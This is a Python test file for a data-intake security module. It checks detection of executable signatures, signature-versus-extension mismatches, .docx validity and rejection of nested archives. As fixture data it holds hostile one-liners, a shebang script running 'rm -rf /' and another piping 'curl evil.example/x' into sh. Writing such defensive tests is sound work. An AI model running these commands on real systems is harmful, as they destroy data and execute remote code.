"""Tests for intake hardening (Phase 15a): the signature/MIME check beyond
the existing %PDF-only magic-byte check, the executable-content scan, the
archive-depth guard, and the fix for nested archives never being
re-inspected.

The two named proofs from the phase plan:
  * a real executable/script signature is rejected regardless of the
    extension it is smuggled under;
  * a nested archive (a .zip inside an already-accepted ZIP) is either
    re-inspected with the same safety checks or explicitly rejected -- this
    module chose explicit rejection (no accepted intake component takes an
    archive extension, so a nested archive has no legitimate destination),
    and proves the nested archive's own inner content is never extracted or
    otherwise materialized on disk, whatever name it is given.
"""
from __future__ import annotations

import io
import zipfile

from phi_core.intake import (
    _docx_is_readable,
    _executable_signature,
    _signature_matches_extension,
    scan_intake,
    unpack_zip,
)

# ---------------------------------------------------------------------------
# Executable-content scan
# ---------------------------------------------------------------------------


def test_pe_signature_is_detected():
    assert "PE" in _executable_signature(b"MZ\x90\x00\x03\x00\x00\x00")


def test_elf_signature_is_detected():
    assert "ELF" in _executable_signature(b"\x7fELF\x02\x01\x01\x00")


def test_macho_signature_is_detected():
    assert "Mach-O" in _executable_signature(b"\xfe\xed\xfa\xce\x00\x00\x00\x07")
    assert "Mach-O" in _executable_signature(b"\xcf\xfa\xed\xfe\x07\x00\x00\x01")


def test_shebang_script_is_detected():
    assert "shebang" in _executable_signature(b"#!/bin/sh\nrm -rf /\n")


def test_ordinary_csv_bytes_have_no_executable_signature():
    assert _executable_signature(b"id,name\n1,Jane\n") == ""


def test_csv_dataset_containing_a_pe_binary_is_rejected_as_unclassified(tmp_path):
    datasets = tmp_path / "datasets"
    datasets.mkdir()
    (datasets / "study.csv").write_bytes(b"id\n1\n")
    (datasets / "evil.csv").write_bytes(b"MZ\x90\x00" + b"\x00" * 64)

    entries, _ = scan_intake(tmp_path)
    rejected = {e.relpath: e for e in entries if e.relpath == "datasets/evil.csv"}
    assert rejected["datasets/evil.csv"].component == "_unclassified"
    assert "executable content detected" in rejected["datasets/evil.csv"].reason
    assert "PE" in rejected["datasets/evil.csv"].reason

    # The legitimate sibling file is unaffected.
    ok = {e.relpath: e for e in entries if e.relpath == "datasets/study.csv"}
    assert ok["datasets/study.csv"].component == "datasets"


def test_csv_dataset_containing_a_shebang_script_is_rejected(tmp_path):
    datasets = tmp_path / "datasets"
    datasets.mkdir()
    (datasets / "study.csv").write_bytes(b"id\n1\n")
    (datasets / "script.csv").write_bytes(b"#!/bin/bash\ncurl evil.example/x | sh\n")

    entries, _ = scan_intake(tmp_path)
    rejected = next(e for e in entries if e.relpath == "datasets/script.csv")
    assert rejected.component == "_unclassified"
    assert "shebang" in rejected.reason


# ---------------------------------------------------------------------------
# Signature-vs-extension check
# ---------------------------------------------------------------------------


def test_csv_that_is_secretly_a_zip_is_rejected():
    ok, reason = _signature_matches_extension(b"PK\x03\x04\x14\x00", ".csv")
    assert ok is False
    assert "zip archive" in reason


def test_xlsx_without_zip_signature_is_rejected():
    ok, reason = _signature_matches_extension(b"not a zip at all", ".xlsx")
    assert ok is False
    assert "zip signature" in reason


def test_docx_without_zip_signature_is_rejected():
    ok, reason = _signature_matches_extension(b"plain text pretending to be docx", ".docx")
    assert ok is False
    assert "zip signature" in reason


def test_pdf_without_magic_is_rejected():
    ok, reason = _signature_matches_extension(b"not a pdf", ".pdf")
    assert ok is False
    assert "%PDF-" in reason


def test_genuine_pdf_magic_passes():
    ok, _ = _signature_matches_extension(b"%PDF-1.7\n", ".pdf")
    assert ok is True


def test_renamed_xlsx_that_is_really_plain_text_is_rejected_by_scan_intake(tmp_path):
    """A .xlsx that does not start with zip magic bytes must be caught by
    the new signature check, not merely fall through to whatever openpyxl
    happens to do with garbage input."""
    dictionary = tmp_path / "dictionary"
    dictionary.mkdir()
    (dictionary / "codebook.xlsx").write_text("this is not a real xlsx file\n", encoding="utf-8")

    entries, _ = scan_intake(tmp_path)
    rejected = next(e for e in entries if e.relpath == "dictionary/codebook.xlsx")
    assert rejected.component == "_unclassified"
    assert "zip signature" in rejected.reason


# ---------------------------------------------------------------------------
# .docx: previously had NO readability check at all -- Phase 15a closes that
# gap. Prove the gap existed (garbage .docx would have been silently
# accepted before) is now closed.
# ---------------------------------------------------------------------------


def _make_minimal_docx(path) -> None:
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types/>')
        zf.writestr("word/document.xml", '<?xml version="1.0"?><document/>')


def test_genuine_docx_is_accepted_into_dictionary(tmp_path):
    dictionary = tmp_path / "dictionary"
    dictionary.mkdir()
    _make_minimal_docx(dictionary / "codebook.docx")
    datasets = tmp_path / "datasets"
    datasets.mkdir()
    (datasets / "study.csv").write_text("id\n1\n", encoding="utf-8")

    entries, missing = scan_intake(tmp_path)
    accepted = next(e for e in entries if e.relpath == "dictionary/codebook.docx")
    assert accepted.component == "dictionary"
    assert missing == []


def test_docx_missing_content_types_xml_is_rejected_not_a_genuine_ooxml_container(tmp_path):
    p = tmp_path / "fake.docx"
    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("random_entry.txt", "hello")
    ok, reason = _docx_is_readable(p)
    assert ok is False
    assert "Content_Types" in reason


def test_docx_that_is_plain_garbage_is_now_rejected_by_scan_intake(tmp_path):
    """Before Phase 15a, .docx had no format-specific check at all in
    scan_intake -- a garbage file named codebook.docx would have been
    silently accepted into the dictionary component. It must now be
    rejected (either by the signature check or the OOXML-container check)."""
    dictionary = tmp_path / "dictionary"
    dictionary.mkdir()
    (dictionary / "codebook.docx").write_bytes(b"not a docx at all, just bytes")

    entries, _ = scan_intake(tmp_path)
    rejected = next(e for e in entries if e.relpath == "dictionary/codebook.docx")
    assert rejected.component == "_unclassified"


# ---------------------------------------------------------------------------
# Archive-depth guard: nested archives are rejected outright, and their
# inner content is never extracted through them ("nested archives must be
# re-inspected" proof -- this module's answer is explicit rejection).
# ---------------------------------------------------------------------------


def _zip_bytes(entries: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in entries.items():
            z.writestr(name, data)
    return buf.getvalue()


def test_nested_zip_by_extension_is_rejected_and_never_written_to_disk(tmp_path):
    inner_marker = b"ZZZINNERPAYLOADMARKERONE"
    inner_bytes = _zip_bytes({"secret.exe": b"MZ\x90\x00" + inner_marker})
    outer_bytes = _zip_bytes({
        "datasets/study.csv": b"id\n1\n",
        "datasets/nested.zip": inner_bytes,
    })
    zip_path = tmp_path / "study.zip"
    zip_path.write_bytes(outer_bytes)

    dest = tmp_path / "unpacked"
    extracted, error = unpack_zip(zip_path, dest)

    assert error is not None
    assert "nested archive not allowed" in error
    # The nested archive itself was never written...
    assert not (dest / "datasets" / "nested.zip").exists()
    # ...and its inner payload was never extracted through it either: walk
    # everything that DID land on disk and confirm the inner marker is
    # nowhere in it. This is the "never silently written and never
    # reopened" bug, closed: the outer unpack fails closed before either
    # happens.
    on_disk = b"".join(p.read_bytes() for p in dest.rglob("*") if p.is_file())
    assert inner_marker not in on_disk
    assert b"secret.exe" not in on_disk


def test_nested_zip_renamed_with_a_csv_extension_is_still_caught_by_magic_bytes(tmp_path):
    """A nested archive is not merely rejected by its literal .zip suffix --
    renaming it to look like an accepted extension must not bypass the
    guard, or the depth check would be trivially defeated."""
    inner_marker = b"ZZZINNERPAYLOADMARKERTWO"
    inner_bytes = _zip_bytes({"payload.txt": inner_marker})
    outer_bytes = _zip_bytes({
        "datasets/study.csv": b"id\n1\n",
        "datasets/disguised.csv": inner_bytes,  # a zip archive, renamed .csv
    })
    zip_path = tmp_path / "study.zip"
    zip_path.write_bytes(outer_bytes)

    dest = tmp_path / "unpacked"
    extracted, error = unpack_zip(zip_path, dest)

    assert error is not None
    assert "nested archive not allowed" in error
    assert "zip magic bytes" in error
    assert not (dest / "datasets" / "disguised.csv").exists()
    on_disk = b"".join(p.read_bytes() for p in dest.rglob("*") if p.is_file())
    assert inner_marker not in on_disk


def test_doubly_nested_zip_never_reaches_the_innermost_payload(tmp_path):
    """A zip-of-a-zip-of-a-zip: the outer unpack must reject at the first
    level of nesting it encounters, so the innermost payload is never
    reached at all, regardless of how many further levels it hides."""
    innermost_marker = b"ZZZINNERMOSTPAYLOADMARKER"
    innermost = _zip_bytes({"deep.txt": innermost_marker})
    middle = _zip_bytes({"middle.zip": innermost})
    outer_bytes = _zip_bytes({
        "datasets/study.csv": b"id\n1\n",
        "datasets/outer_nested.zip": middle,
    })
    zip_path = tmp_path / "study.zip"
    zip_path.write_bytes(outer_bytes)

    dest = tmp_path / "unpacked"
    extracted, error = unpack_zip(zip_path, dest)

    assert error is not None
    assert "nested archive not allowed" in error
    on_disk = b"".join(p.read_bytes() for p in dest.rglob("*") if p.is_file())
    assert innermost_marker not in on_disk


def test_ordinary_zip_with_no_nested_archives_still_unpacks_cleanly(tmp_path):
    """Regression check: the archive-depth guard must not trip on an
    entirely ordinary zip that merely happens to contain no archives."""
    outer_bytes = _zip_bytes({
        "datasets/study.csv": b"id\n1\n",
        "dictionary/codebook.csv": b"field,description\nid,identifier\n",
    })
    zip_path = tmp_path / "study.zip"
    zip_path.write_bytes(outer_bytes)

    dest = tmp_path / "unpacked"
    extracted, error = unpack_zip(zip_path, dest)

    assert error is None
    assert set(extracted) == {"datasets/study.csv", "dictionary/codebook.csv"}